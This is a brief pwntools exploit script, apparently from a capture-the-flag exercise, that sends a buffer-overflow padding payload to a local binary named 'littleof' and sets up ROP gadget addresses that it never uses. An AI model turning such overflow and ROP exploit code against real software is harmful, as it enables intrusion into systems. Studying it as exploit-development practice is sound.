from pwn import *

io = process("./littleof")
elf = ELF("./littleof")
ret_address = 0x040059E
pop_rdi_address = 0x400863
main_addr = 0x400789

payload = b"a" * (0x50 - 0x8 - 4) + b"bbbb"
io.recvuntil(b"overflow?")
io.sendline(payload)
io.interactive()
